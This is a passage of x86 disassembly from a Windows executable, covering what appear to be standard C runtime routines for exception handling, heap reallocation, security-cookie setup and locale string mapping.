  4272af:	lea    ecx,[esi+0x1]
  4272b2:	mov    DWORD PTR [edx],ecx
  4272b4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4272b8:	mov    esi,DWORD PTR [ebp-0xc]
  4272bb:	mov    ecx,DWORD PTR [esi]
  4272bd:	test   ecx,ecx
  4272bf:	lea    edi,[ecx+0x1]
  4272c2:	mov    DWORD PTR [esi],edi
  4272c4:	jne    0x4272e0
  4272c6:	cmp    ebx,DWORD PTR ds:0x4639f8
  4272cc:	jne    0x4272e0
  4272ce:	mov    ecx,DWORD PTR [ebp-0x4]
  4272d1:	cmp    ecx,DWORD PTR ds:0x463a10
  4272d7:	jne    0x4272e0
  4272d9:	and    DWORD PTR ds:0x4639f8,0x0
  4272e0:	mov    ecx,DWORD PTR [ebp-0x4]
  4272e3:	mov    DWORD PTR [eax],ecx
  4272e5:	lea    eax,[edx+0x4]
  4272e8:	pop    edi
  4272e9:	pop    esi
  4272ea:	pop    ebx
  4272eb:	leave  
  4272ec:	ret    
  4272ed:	int3   
  4272ee:	int3   
  4272ef:	int3   
  4272f0:	push   esi
  4272f1:	inc    ebx
  4272f2:	xor    dh,BYTE PTR [eax]
  4272f4:	pop    eax
  4272f5:	inc    ebx
  4272f6:	xor    BYTE PTR [eax],dh
  4272f8:	push   ebp
  4272f9:	mov    ebp,esp
  4272fb:	sub    esp,0x8
  4272fe:	push   ebx
  4272ff:	push   esi
  427300:	push   edi
  427301:	push   ebp
  427302:	cld    
  427303:	mov    ebx,DWORD PTR [ebp+0xc]
  427306:	mov    eax,DWORD PTR [ebp+0x8]
  427309:	test   DWORD PTR [eax+0x4],0x6
  427310:	jne    0x427398
  427316:	mov    DWORD PTR [ebp-0x8],eax
  427319:	mov    eax,DWORD PTR [ebp+0x10]
  42731c:	mov    DWORD PTR [ebp-0x4],eax
  42731f:	lea    eax,[ebp-0x8]
  427322:	mov    DWORD PTR [ebx-0x4],eax
  427325:	mov    esi,DWORD PTR [ebx+0xc]
  427328:	mov    edi,DWORD PTR [ebx+0x8]
  42732b:	cmp    esi,0xffffffff
  42732e:	je     0x427391
  427330:	lea    ecx,[esi+esi*2]
  427333:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  427338:	je     0x42737f
  42733a:	push   esi
  42733b:	push   ebp
  42733c:	lea    ebp,[ebx+0x10]
  42733f:	call   DWORD PTR [edi+ecx*4+0x4]
  427343:	pop    ebp
  427344:	pop    esi
  427345:	mov    ebx,DWORD PTR [ebp+0xc]
  427348:	or     eax,eax
  42734a:	je     0x42737f
  42734c:	js     0x42738a
  42734e:	mov    edi,DWORD PTR [ebx+0x8]
  427351:	push   ebx
  427352:	call   0x428280
  427357:	add    esp,0x4
  42735a:	lea    ebp,[ebx+0x10]
  42735d:	push   esi
  42735e:	push   ebx
  42735f:	call   0x4282c2
  427364:	add    esp,0x8
  427367:	lea    ecx,[esi+esi*2]
  42736a:	push   0x1
  42736c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  427370:	call   0x428356
  427375:	mov    eax,DWORD PTR [edi+ecx*4]
  427378:	mov    DWORD PTR [ebx+0xc],eax
  42737b:	call   DWORD PTR [edi+ecx*4+0x8]
  42737f:	mov    edi,DWORD PTR [ebx+0x8]
  427382:	lea    ecx,[esi+esi*2]
  427385:	mov    esi,DWORD PTR [edi+ecx*4]
  427388:	jmp    0x42732b
  42738a:	mov    eax,0x0
  42738f:	jmp    0x4273ad
  427391:	mov    eax,0x1
  427396:	jmp    0x4273ad
  427398:	push   ebp
  427399:	lea    ebp,[ebx+0x10]
  42739c:	push   0xffffffff
  42739e:	push   ebx
  42739f:	call   0x4282c2
  4273a4:	add    esp,0x8
  4273a7:	pop    ebp
  4273a8:	mov    eax,0x1
  4273ad:	pop    ebp
  4273ae:	pop    edi
  4273af:	pop    esi
  4273b0:	pop    ebx
  4273b1:	mov    esp,ebp
  4273b3:	pop    ebp
  4273b4:	ret    
  4273b5:	push   ebp
  4273b6:	mov    ecx,DWORD PTR [esp+0x8]
  4273ba:	mov    ebp,DWORD PTR [ecx]
  4273bc:	mov    eax,DWORD PTR [ecx+0x1c]
  4273bf:	push   eax
  4273c0:	mov    eax,DWORD PTR [ecx+0x18]
  4273c3:	push   eax
  4273c4:	call   0x4282c2
  4273c9:	add    esp,0x8
  4273cc:	pop    ebp
  4273cd:	ret    0x4
  4273d0:	call   0x4252e9
  4273d5:	add    eax,0x8
  4273d8:	ret    
  4273d9:	push   0x14
  4273db:	push   0x4298c0
  4273e0:	call   0x425434
  4273e5:	mov    edi,DWORD PTR [ebp+0x8]
  4273e8:	xor    ebx,ebx
  4273ea:	cmp    edi,ebx
  4273ec:	jne    0x4273fc
  4273ee:	push   DWORD PTR [ebp+0xc]
  4273f1:	call   0x426152
  4273f6:	pop    ecx
  4273f7:	jmp    0x427580
  4273fc:	mov    esi,DWORD PTR [ebp+0xc]
  4273ff:	cmp    esi,ebx
  427401:	jne    0x42740f
  427403:	push   edi
  427404:	call   0x42603a
  427409:	pop    ecx
  42740a:	jmp    0x42757e
  42740f:	cmp    DWORD PTR ds:0x463c44,0x3
  427416:	jne    0x42754a
  42741c:	mov    DWORD PTR [ebp-0x1c],ebx
  42741f:	cmp    esi,0xffffffe0
  427422:	ja     0x427519
  427428:	push   0x4
  42742a:	call   0x4255ef
  42742f:	pop    ecx
  427430:	mov    DWORD PTR [ebp-0x4],ebx
  427433:	push   edi
  427434:	call   0x426812
  427439:	pop    ecx
  42743a:	mov    DWORD PTR [ebp-0x20],eax
  42743d:	cmp    eax,ebx
  42743f:	je     0x4274e9
  427445:	cmp    esi,DWORD PTR ds:0x463a04
  42744b:	ja     0x427499
  42744d:	push   esi
  42744e:	push   edi
  42744f:	push   eax
  427450:	call   0x426d12
  427455:	add    esp,0xc
  427458:	test   eax,eax
  42745a:	je     0x427461
  42745c:	mov    DWORD PTR [ebp-0x1c],edi
  42745f:	jmp    0x427499
  427461:	push   esi
  427462:	call   0x426ff1
  427467:	pop    ecx
  427468:	mov    DWORD PTR [ebp-0x1c],eax
  42746b:	cmp    eax,ebx
  42746d:	je     0x427499
  42746f:	mov    eax,DWORD PTR [edi-0x4]
  427472:	dec    eax
  427473:	mov    DWORD PTR [ebp-0x24],eax
  427476:	cmp    eax,esi
  427478:	jb     0x42747c
  42747a:	mov    eax,esi
  42747c:	push   eax
  42747d:	push   edi
  42747e:	push   DWORD PTR [ebp-0x1c]
  427481:	call   0x426170
  427486:	push   edi
  427487:	call   0x426812
  42748c:	mov    DWORD PTR [ebp-0x20],eax
  42748f:	push   edi
  427490:	push   eax
  427491:	call   0x42683d
  427496:	add    esp,0x18
  427499:	cmp    DWORD PTR [ebp-0x1c],ebx
  42749c:	jne    0x4274e9
  42749e:	cmp    esi,ebx
  4274a0:	jne    0x4274a8
  4274a2:	xor    esi,esi
  4274a4:	inc    esi
  4274a5:	mov    DWORD PTR [ebp+0xc],esi
  4274a8:	add    esi,0xf
  4274ab:	and    esi,0xfffffff0
  4274ae:	mov    DWORD PTR [ebp+0xc],esi
  4274b1:	push   esi
  4274b2:	push   ebx
  4274b3:	push   DWORD PTR ds:0x463c40
  4274b9:	call   DWORD PTR ds:0x429038
  4274bf:	mov    DWORD PTR [ebp-0x1c],eax
  4274c2:	cmp    eax,ebx
  4274c4:	je     0x4274e9
  4274c6:	mov    eax,DWORD PTR [edi-0x4]
  4274c9:	dec    eax
  4274ca:	mov    DWORD PTR [ebp-0x24],eax
  4274cd:	cmp    eax,esi
  4274cf:	jb     0x4274d3
  4274d1:	mov    eax,esi
  4274d3:	push   eax
  4274d4:	push   edi
  4274d5:	push   DWORD PTR [ebp-0x1c]
  4274d8:	call   0x426170
  4274dd:	push   edi
  4274de:	push   DWORD PTR [ebp-0x20]
  4274e1:	call   0x42683d
  4274e6:	add    esp,0x14
  4274e9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4274ed:	call   0x427541
  4274f2:	cmp    DWORD PTR [ebp-0x20],ebx
  4274f5:	jne    0x427519
  4274f7:	cmp    esi,ebx
  4274f9:	jne    0x4274fe
  4274fb:	xor    esi,esi
  4274fd:	inc    esi
  4274fe:	add    esi,0xf
  427501:	and    esi,0xfffffff0
  427504:	mov    DWORD PTR [ebp+0xc],esi
  427507:	push   esi
  427508:	push   edi
  427509:	push   ebx
  42750a:	push   DWORD PTR ds:0x463c40
  427510:	call   DWORD PTR ds:0x42910c
  427516:	mov    DWORD PTR [ebp-0x1c],eax
  427519:	mov    eax,DWORD PTR [ebp-0x1c]
  42751c:	cmp    eax,ebx
  42751e:	jne    0x427580
  427520:	cmp    DWORD PTR ds:0x4638c8,ebx
  427526:	je     0x427580
  427528:	push   esi
  427529:	call   0x427d12
  42752e:	pop    ecx
  42752f:	test   eax,eax
  427531:	jne    0x42741c
  427537:	jmp    0x42757e
  427539:	xor    ebx,ebx
  42753b:	mov    esi,DWORD PTR [ebp+0xc]
  42753e:	mov    edi,DWORD PTR [ebp+0x8]
  427541:	push   0x4
  427543:	call   0x42555b
  427548:	pop    ecx
  427549:	ret    
  42754a:	xor    eax,eax
  42754c:	cmp    esi,0xffffffe0
  42754f:	ja     0x427567
  427551:	cmp    esi,ebx
  427553:	jne    0x427558
  427555:	xor    esi,esi
  427557:	inc    esi
  427558:	push   esi
  427559:	push   edi
  42755a:	push   ebx
  42755b:	push   DWORD PTR ds:0x463c40
  427561:	call   DWORD PTR ds:0x42910c
  427567:	cmp    eax,ebx
  427569:	jne    0x427580
  42756b:	cmp    DWORD PTR ds:0x4638c8,ebx
  427571:	je     0x427580
  427573:	push   esi
  427574:	call   0x427d12
  427579:	pop    ecx
  42757a:	test   eax,eax
  42757c:	jne    0x42754a
  42757e:	xor    eax,eax
  427580:	call   0x42546f
  427585:	ret    
  427586:	push   0x10
  427588:	push   0x4298d0
  42758d:	call   0x425434
  427592:	cmp    DWORD PTR ds:0x463c44,0x3
  427599:	jne    0x4275d5
  42759b:	push   0x4
  42759d:	call   0x4255ef
  4275a2:	pop    ecx
  4275a3:	and    DWORD PTR [ebp-0x4],0x0
  4275a7:	mov    esi,DWORD PTR [ebp+0x8]
  4275aa:	push   esi
  4275ab:	call   0x426812
  4275b0:	pop    ecx
  4275b1:	mov    DWORD PTR [ebp-0x1c],eax
  4275b4:	test   eax,eax
  4275b6:	je     0x4275c3
  4275b8:	mov    esi,DWORD PTR [esi-0x4]
  4275bb:	sub    esi,0x9
  4275be:	mov    DWORD PTR [ebp-0x20],esi
  4275c1:	jmp    0x4275c6
  4275c3:	mov    esi,DWORD PTR [ebp-0x20]
  4275c6:	or     DWORD PTR [ebp-0x4],0xffffffff
  4275ca:	call   0x4275f3
  4275cf:	cmp    DWORD PTR [ebp-0x1c],0x0
  4275d3:	jne    0x4275e8
  4275d5:	push   DWORD PTR [ebp+0x8]
  4275d8:	push   0x0
  4275da:	push   DWORD PTR ds:0x463c40
  4275e0:	call   DWORD PTR ds:0x429110
  4275e6:	mov    esi,eax
  4275e8:	mov    eax,esi
  4275ea:	call   0x42546f
  4275ef:	ret    
  4275f0:	mov    esi,DWORD PTR [ebp-0x20]
  4275f3:	push   0x4
  4275f5:	call   0x42555b
  4275fa:	pop    ecx
  4275fb:	ret    
  4275fc:	push   ebp
  4275fd:	mov    ebp,esp
  4275ff:	sub    esp,0x10
  427602:	push   esi
  427603:	lea    eax,[ebp-0x8]
  427606:	push   eax
  427607:	call   DWORD PTR ds:0x429120
  42760d:	mov    esi,DWORD PTR [ebp-0x4]
  427610:	xor    esi,DWORD PTR [ebp-0x8]
  427613:	call   DWORD PTR ds:0x42911c
  427619:	xor    esi,eax
  42761b:	call   DWORD PTR ds:0x4290d8
  427621:	xor    esi,eax
  427623:	call   DWORD PTR ds:0x429118
  427629:	xor    esi,eax
  42762b:	lea    eax,[ebp-0x10]
  42762e:	push   eax
  42762f:	call   DWORD PTR ds:0x429114
  427635:	mov    eax,DWORD PTR [ebp-0xc]
  427638:	xor    eax,DWORD PTR [ebp-0x10]
  42763b:	xor    esi,eax
  42763d:	mov    DWORD PTR ds:0x462f30,esi
  427643:	jne    0x42764f
  427645:	mov    DWORD PTR ds:0x462f30,0xbb40e64e
  42764f:	pop    esi
  427650:	leave  
  427651:	ret    
  427652:	push   0x118
  427657:	push   0x429a80
  42765c:	call   0x425434
  427661:	mov    eax,ds:0x462f30
  427666:	xor    eax,DWORD PTR [ebp+0x4]
  427669:	mov    DWORD PTR [ebp-0x1c],eax
  42766c:	mov    eax,ds:0x463898
  427671:	xor    ecx,ecx
  427673:	cmp    eax,ecx
  427675:	je     0x427696
  427677:	mov    DWORD PTR [ebp-0x4],ecx
  42767a:	push   DWORD PTR [ebp+0xc]
  42767d:	push   DWORD PTR [ebp+0x8]
  427680:	call   eax
  427682:	pop    ecx
  427683:	pop    ecx
  427684:	or     DWORD PTR [ebp-0x4],0xffffffff
  427688:	jmp    0x427794
  42768d:	xor    eax,eax
  42768f:	inc    eax
  427690:	ret    
  427691:	mov    esp,DWORD PTR [ebp-0x18]
  427694:	jmp    0x427684
  427696:	mov    eax,DWORD PTR [ebp+0x8]
  427699:	dec    eax
  42769a:	je     0x4276af
  42769c:	mov    edi,0x429a5c
  4276a1:	mov    DWORD PTR [ebp-0x20],0x4299a8
  4276a8:	mov    esi,0xd4
  4276ad:	jmp    0x4276c0
  4276af:	mov    edi,0x429988
  4276b4:	mov    DWORD PTR [ebp-0x20],0x4298e8
  4276bb:	mov    esi,0xb9
  4276c0:	mov    BYTE PTR [ebp-0x24],cl
  4276c3:	push   0x104
  4276c8:	lea    eax,[ebp-0x128]
  4276ce:	push   eax
  4276cf:	push   ecx
  4276d0:	call   DWORD PTR ds:0x4290a8
  4276d6:	test   eax,eax
  4276d8:	jne    0x4276ed
  4276da:	push   0x4295dc
  4276df:	lea    eax,[ebp-0x128]
  4276e5:	push   eax
  4276e6:	call   0x425810
  4276eb:	pop    ecx
  4276ec:	pop    ecx
  4276ed:	lea    ebx,[ebp-0x128]
  4276f3:	lea    eax,[ebp-0x128]
  4276f9:	push   eax
  4276fa:	call   0x425a40
  4276ff:	pop    ecx
  427700:	add    eax,0xb
  427703:	cmp    eax,0x3c
  427706:	jbe    0x427731
  427708:	lea    eax,[ebp-0x128]
  42770e:	push   eax
  42770f:	call   0x425a40
  427714:	mov    ebx,eax
  427716:	lea    eax,[ebp-0x128]
  42771c:	sub    eax,0x31
  42771f:	add    ebx,eax
  427721:	push   0x3
  427723:	push   0x4295d8
  427728:	push   ebx
  427729:	call   0x425910
  42772e:	add    esp,0x10
  427731:	push   ebx
  427732:	call   0x425a40
  427737:	pop    ecx
  427738:	lea    eax,[eax+esi*1+0xc]
  42773c:	add    eax,0x3
  42773f:	and    eax,0xfffffffc
  427742:	call   0x425480
  427747:	mov    DWORD PTR [ebp-0x18],esp
  42774a:	mov    esi,esp
  42774c:	push   edi
  42774d:	push   esi
  42774e:	call   0x425810
  427753:	mov    edi,0x4295b8
  427758:	push   edi
  427759:	push   esi
  42775a:	call   0x425820
  42775f:	push   0x4298dc
  427764:	push   esi
  427765:	call   0x425820
  42776a:	push   ebx
  42776b:	push   esi
  42776c:	call   0x425820
  427771:	push   edi
  427772:	push   esi
  427773:	call   0x425820
  427778:	push   DWORD PTR [ebp-0x20]
  42777b:	push   esi
  42777c:	call   0x425820
  427781:	push   0x12010
  427786:	push   0x429590
  42778b:	push   esi
  42778c:	call   0x425712
  427791:	add    esp,0x3c
  427794:	push   0x3
  427796:	call   0x4248a2
  42779b:	int3   
  42779c:	push   0x38
  42779e:	push   0x429ea0
  4277a3:	call   0x425434
  4277a8:	xor    ebx,ebx
  4277aa:	cmp    DWORD PTR ds:0x4638bc,ebx
  4277b0:	jne    0x4277ea
  4277b2:	push   ebx
  4277b3:	push   ebx
  4277b4:	xor    esi,esi
  4277b6:	inc    esi
  4277b7:	push   esi
  4277b8:	push   0x429e9c
  4277bd:	push   0x100
  4277c2:	push   ebx
  4277c3:	call   DWORD PTR ds:0x42912c
  4277c9:	test   eax,eax
  4277cb:	je     0x4277d5
  4277cd:	mov    DWORD PTR ds:0x4638bc,esi
  4277d3:	jmp    0x4277ea
  4277d5:	call   DWORD PTR ds:0x429030
  4277db:	cmp    eax,0x78
  4277de:	jne    0x4277ea
  4277e0:	mov    DWORD PTR ds:0x4638bc,0x2
  4277ea:	cmp    DWORD PTR [ebp+0x14],ebx
  4277ed:	jle    0x42780a
  4277ef:	mov    ecx,DWORD PTR [ebp+0x14]
  4277f2:	mov    eax,DWORD PTR [ebp+0x10]
  4277f5:	dec    ecx
  4277f6:	cmp    BYTE PTR [eax],bl
  4277f8:	je     0x427802
  4277fa:	inc    eax
  4277fb:	cmp    ecx,ebx
  4277fd:	jne    0x4277f5
  4277ff:	or     ecx,0xffffffff
  427802:	or     eax,0xffffffff
  427805:	sub    eax,ecx
  427807:	add    DWORD PTR [ebp+0x14],eax
  42780a:	mov    eax,ds:0x4638bc
  42780f:	cmp    eax,0x2
  427812:	je     0x4279f4
  427818:	cmp    eax,ebx
  42781a:	je     0x4279f4
  427820:	cmp    eax,0x1
  427823:	jne    0x427a27
  427829:	xor    edi,edi
  42782b:	mov    DWORD PTR [ebp-0x1c],edi
  42782e:	mov    DWORD PTR [ebp-0x20],ebx
  427831:	mov    DWORD PTR [ebp-0x24],ebx
  427834:	cmp    DWORD PTR [ebp+0x20],ebx
  427837:	jne    0x427841
  427839:	mov    eax,ds:0x4638b4
  42783e:	mov    DWORD PTR [ebp+0x20],eax
  427841:	push   ebx
  427842:	push   ebx
  427843:	push   DWORD PTR [ebp+0x14]
  427846:	push   DWORD PTR [ebp+0x10]
  427849:	xor    eax,eax
  42784b:	cmp    DWORD PTR [ebp+0x24],ebx
  42784e:	setne  al
  427851:	lea    eax,[eax*8+0x1]
  427858:	push   eax
  427859:	push   DWORD PTR [ebp+0x20]
  42785c:	call   DWORD PTR ds:0x429128
  427862:	mov    esi,eax
  427864:	mov    DWORD PTR [ebp-0x28],esi
  427867:	cmp    esi,ebx
  427869:	je     0x427a27
  42786f:	mov    DWORD PTR [ebp-0x4],0x1
  427876:	lea    eax,[esi+esi*1]
  427879:	add    eax,0x3
  42787c:	and    eax,0xfffffffc
  42787f:	call   0x425480
  427884:	mov    DWORD PTR [ebp-0x18],esp
  427887:	mov    eax,esp
  427889:	mov    DWORD PTR [ebp-0x2c],eax
  42788c:	or     DWORD PTR [ebp-0x4],0xffffffff
  427890:	jmp    0x4278ad
  427892:	xor    eax,eax
  427894:	inc    eax
  427895:	ret    
  427896:	mov    esp,DWORD PTR [ebp-0x18]
  427899:	call   0x4288c5
  42789e:	xor    ebx,ebx
  4278a0:	mov    DWORD PTR [ebp-0x2c],ebx
  4278a3:	or     DWORD PTR [ebp-0x4],0xffffffff
  4278a7:	mov    edi,DWORD PTR [ebp-0x1c]
  4278aa:	mov    esi,DWORD PTR [ebp-0x28]
  4278ad:	cmp    DWORD PTR [ebp-0x2c],ebx
  4278b0:	jne    0x4278ce
  4278b2:	lea    eax,[esi+esi*1]
  4278b5:	push   eax
  4278b6:	call   0x426152
  4278bb:	pop    ecx
  4278bc:	mov    DWORD PTR [ebp-0x2c],eax
  4278bf:	cmp    eax,ebx
  4278c1:	je     0x427a27
  4278c7:	mov    DWORD PTR [ebp-0x20],0x1
  4278ce:	push   esi
  4278cf:	push   DWORD PTR [ebp-0x2c]
  4278d2:	push   DWORD PTR [ebp+0x14]
  4278d5:	push   DWORD PTR [ebp+0x10]
  4278d8:	push   0x1
  4278da:	push   DWORD PTR [ebp+0x20]
  4278dd:	call   DWORD PTR ds:0x429128
  4278e3:	test   eax,eax
  4278e5:	je     0x4279d1
  4278eb:	push   ebx
  4278ec:	push   ebx
  4278ed:	push   esi
  4278ee:	push   DWORD PTR [ebp-0x2c]
  4278f1:	push   DWORD PTR [ebp+0xc]
  4278f4:	push   DWORD PTR [ebp+0x8]
  4278f7:	call   DWORD PTR ds:0x42912c
  4278fd:	mov    edi,eax
  4278ff:	mov    DWORD PTR [ebp-0x1c],edi
  427902:	cmp    edi,ebx
  427904:	je     0x4279d1
  42790a:	test   BYTE PTR [ebp+0xd],0x4
  42790e:	je     0x42793d
  427910:	cmp    DWORD PTR [ebp+0x1c],ebx
  427913:	je     0x4279d1
  427919:	cmp    edi,DWORD PTR [ebp+0x1c]
  42791c:	jg     0x4279d1
  427922:	push   DWORD PTR [ebp+0x1c]
  427925:	push   DWORD PTR [ebp+0x18]
  427928:	push   esi
  427929:	push   DWORD PTR [ebp-0x2c]
  42792c:	push   DWORD PTR [ebp+0xc]
  42792f:	push   DWORD PTR [ebp+0x8]
  427932:	call   DWORD PTR ds:0x42912c
  427938:	jmp    0x4279d1
  42793d:	mov    DWORD PTR [ebp-0x4],0x2
  427944:	lea    eax,[edi+edi*1]
  427947:	add    eax,0x3
  42794a:	and    eax,0xfffffffc
  42794d:	call   0x425480
  427952:	mov    DWORD PTR [ebp-0x18],esp
  427955:	mov    eax,esp
  427957:	mov    DWORD PTR [ebp-0x30],eax
  42795a:	or     DWORD PTR [ebp-0x4],0xffffffff
  42795e:	jmp    0x42797b
  427960:	xor    eax,eax
  427962:	inc    eax
  427963:	ret    
  427964:	mov    esp,DWORD PTR [ebp-0x18]
  427967:	call   0x4288c5
  42796c:	xor    ebx,ebx
  42796e:	mov    DWORD PTR [ebp-0x30],ebx
  427971:	or     DWORD PTR [ebp-0x4],0xffffffff
  427975:	mov    edi,DWORD PTR [ebp-0x1c]
  427978:	mov    esi,DWORD PTR [ebp-0x28]
  42797b:	cmp    DWORD PTR [ebp-0x30],ebx
  42797e:	jne    0x427998
  427980:	lea    eax,[edi+edi*1]
  427983:	push   eax
  427984:	call   0x426152
  427989:	pop    ecx
  42798a:	mov    DWORD PTR [ebp-0x30],eax
  42798d:	cmp    eax,ebx
  42798f:	je     0x4279d1
  427991:	mov    DWORD PTR [ebp-0x24],0x1
  427998:	push   edi
  427999:	push   DWORD PTR [ebp-0x30]
  42799c:	push   esi
  42799d:	push   DWORD PTR [ebp-0x2c]
  4279a0:	push   DWORD PTR [ebp+0xc]
  4279a3:	push   DWORD PTR [ebp+0x8]
  4279a6:	call   DWORD PTR ds:0x42912c
  4279ac:	test   eax,eax
  4279ae:	je     0x4279d1
  4279b0:	push   ebx
  4279b1:	push   ebx
  4279b2:	cmp    DWORD PTR [ebp+0x1c],ebx
  4279b5:	jne    0x4279bb
  4279b7:	push   ebx
  4279b8:	push   ebx
  4279b9:	jmp    0x4279c1
  4279bb:	push   DWORD PTR [ebp+0x1c]
  4279be:	push   DWORD PTR [ebp+0x18]
  4279c1:	push   edi
  4279c2:	push   DWORD PTR [ebp-0x30]
  4279c5:	push   ebx
  4279c6:	push   DWORD PTR [ebp+0x20]
  4279c9:	call   DWORD PTR ds:0x4290bc
  4279cf:	mov    edi,eax
  4279d1:	cmp    DWORD PTR [ebp-0x24],ebx
  4279d4:	je     0x4279df
  4279d6:	push   DWORD PTR [ebp-0x30]
  4279d9:	call   0x42603a
  4279de:	pop    ecx
  4279df:	cmp    DWORD PTR [ebp-0x20],ebx
  4279e2:	je     0x4279ed
  4279e4:	push   DWORD PTR [ebp-0x2c]
  4279e7:	call   0x42603a
  4279ec:	pop    ecx
  4279ed:	mov    eax,edi
  4279ef:	jmp    0x427b4f
  4279f4:	mov    DWORD PTR [ebp-0x34],ebx
  4279f7:	xor    edi,edi
  4279f9:	mov    DWORD PTR [ebp-0x38],ebx
  4279fc:	cmp    DWORD PTR [ebp+0x8],ebx
  4279ff:	jne    0x427a09
  427a01:	mov    eax,ds:0x4638a4
  427a06:	mov    DWORD PTR [ebp+0x8],eax
  427a09:	cmp    DWORD PTR [ebp+0x20],ebx
  427a0c:	jne    0x427a16
  427a0e:	mov    eax,ds:0x4638b4
  427a13:	mov    DWORD PTR [ebp+0x20],eax
  427a16:	push   DWORD PTR [ebp+0x8]
  427a19:	call   0x4286ad
  427a1e:	pop    ecx
  427a1f:	mov    DWORD PTR [ebp-0x3c],eax
  427a22:	cmp    eax,0xffffffff
  427a25:	jne    0x427a2e
  427a27:	xor    eax,eax
  427a29:	jmp    0x427b4f
  427a2e:	cmp    eax,DWORD PTR [ebp+0x20]
  427a31:	je     0x427b25
  427a37:	push   ebx
  427a38:	push   ebx
  427a39:	lea    ecx,[ebp+0x14]
  427a3c:	push   ecx
  427a3d:	push   DWORD PTR [ebp+0x10]
  427a40:	push   eax
  427a41:	push   DWORD PTR [ebp+0x20]
  427a44:	call   0x4286f6
  427a49:	add    esp,0x18
  427a4c:	mov    DWORD PTR [ebp-0x34],eax
  427a4f:	cmp    eax,ebx
  427a51:	je     0x427a27
  427a53:	push   ebx
  427a54:	push   ebx
  427a55:	push   DWORD PTR [ebp+0x14]
  427a58:	push   eax
  427a59:	push   DWORD PTR [ebp+0xc]
  427a5c:	push   DWORD PTR [ebp+0x8]
  427a5f:	call   DWORD PTR ds:0x429124
  427a65:	mov    esi,eax
  427a67:	mov    DWORD PTR [ebp-0x40],esi
  427a6a:	cmp    esi,ebx
  427a6c:	je     0x427b14
  427a72:	mov    DWORD PTR [ebp-0x4],ebx
  427a75:	add    eax,0x3
  427a78:	and    eax,0xfffffffc
  427a7b:	call   0x425480
  427a80:	mov    DWORD PTR [ebp-0x18],esp
  427a83:	mov    edi,esp
  427a85:	mov    DWORD PTR [ebp-0x44],edi
  427a88:	push   esi
  427a89:	push   ebx
  427a8a:	push   edi
  427a8b:	call   0x427d30
  427a90:	add    esp,0xc
  427a93:	jmp    0x427aa5
  427a95:	xor    eax,eax
  427a97:	inc    eax
  427a98:	ret    
  427a99:	mov    esp,DWORD PTR [ebp-0x18]
  427a9c:	call   0x4288c5
  427aa1:	xor    ebx,ebx
  427aa3:	xor    edi,edi
  427aa5:	or     DWORD PTR [ebp-0x4],0xffffffff
  427aa9:	cmp    edi,ebx
  427aab:	jne    0x427ad0
  427aad:	push   DWORD PTR [ebp-0x40]
  427ab0:	call   0x426152
  427ab5:	pop    ecx
  427ab6:	mov    edi,eax
  427ab8:	cmp    edi,ebx
  427aba:	je     0x427aed
  427abc:	push   DWORD PTR [ebp-0x40]
  427abf:	push   ebx
  427ac0:	push   edi
  427ac1:	call   0x427d30
  427ac6:	add    esp,0xc
  427ac9:	mov    DWORD PTR [ebp-0x38],0x1
  427ad0:	push   DWORD PTR [ebp-0x40]
  427ad3:	push   edi
  427ad4:	push   DWORD PTR [ebp+0x14]
  427ad7:	push   DWORD PTR [ebp-0x34]
  427ada:	push   DWORD PTR [ebp+0xc]
  427add:	push   DWORD PTR [ebp+0x8]
  427ae0:	call   DWORD PTR ds:0x429124
  427ae6:	mov    DWORD PTR [ebp-0x40],eax
  427ae9:	cmp    eax,ebx
  427aeb:	jne    0x427af1
  427aed:	xor    esi,esi
  427aef:	jmp    0x427b17
  427af1:	push   DWORD PTR [ebp+0x1c]
  427af4:	push   DWORD PTR [ebp+0x18]
  427af7:	lea    eax,[ebp-0x40]
  427afa:	push   eax
  427afb:	push   edi
  427afc:	push   DWORD PTR [ebp+0x20]
  427aff:	push   DWORD PTR [ebp-0x3c]
  427b02:	call   0x4286f6
  427b07:	add    esp,0x18
  427b0a:	mov    esi,eax
  427b0c:	neg    esi
  427b0e:	sbb    esi,esi
  427b10:	neg    esi
  427b12:	jmp    0x427b17
  427b14:	mov    esi,DWORD PTR [ebp-0x48]
  427b17:	cmp    DWORD PTR [ebp-0x38],ebx
  427b1a:	je     0x427b3f
  427b1c:	push   edi
  427b1d:	call   0x42603a
  427b22:	pop    ecx
  427b23:	jmp    0x427b3f
  427b25:	push   DWORD PTR [ebp+0x1c]
  427b28:	push   DWORD PTR [ebp+0x18]
  427b2b:	push   DWORD PTR [ebp+0x14]
  427b2e:	push   DWORD PTR [ebp+0x10]
  427b31:	push   DWORD PTR [ebp+0xc]
  427b34:	push   DWORD PTR [ebp+0x8]
  427b37:	call   DWORD PTR ds:0x429124
  427b3d:	mov    esi,eax
  427b3f:	cmp    DWORD PTR [ebp-0x34],ebx
  427b42:	je     0x427b4d
  427b44:	push   DWORD PTR [ebp-0x34]
  427b47:	call   0x42603a
  427b4c:	pop    ecx
  427b4d:	mov    eax,esi
  427b4f:	lea    esp,[ebp-0x54]
  427b52:	call   0x42546f
  427b57:	ret    
  427b58:	push   0x1c
  427b5a:	push   0x429ec8
  427b5f:	call   0x425434
  427b64:	xor    esi,esi
  427b66:	cmp    DWORD PTR ds:0x4638c0,esi
  427b6c:	jne    0x427ba3
  427b6e:	lea    eax,[ebp-0x1c]
  427b71:	push   eax
  427b72:	xor    edi,edi
  427b74:	inc    edi
  427b75:	push   edi
  427b76:	push   0x429e9c
  427b7b:	push   edi
  427b7c:	call   DWORD PTR ds:0x429134
  427b82:	test   eax,eax
  427b84:	je     0x427b8e
  427b86:	mov    DWORD PTR ds:0x4638c0,edi
  427b8c:	jmp    0x427ba3
  427b8e:	call   DWORD PTR ds:0x429030
  427b94:	cmp    eax,0x78
  427b97:	jne    0x427ba3
  427b99:	mov    DWORD PTR ds:0x4638c0,0x2
  427ba3:	mov    eax,ds:0x4638c0
  427ba8:	cmp    eax,0x2
  427bab:	je     0x427c9b
  427bb1:	cmp    eax,esi
  427bb3:	je     0x427c9b
  427bb9:	cmp    eax,0x1
  427bbc:	jne    0x427cc1
  427bc2:	mov    DWORD PTR [ebp-0x20],esi
  427bc5:	mov    DWORD PTR [ebp-0x24],esi
  427bc8:	cmp    DWORD PTR [ebp+0x18],esi
  427bcb:	jne    0x427bd5
  427bcd:	mov    eax,ds:0x4638b4
  427bd2:	mov    DWORD PTR [ebp+0x18],eax
  427bd5:	push   esi
  427bd6:	push   esi
  427bd7:	push   DWORD PTR [ebp+0x10]
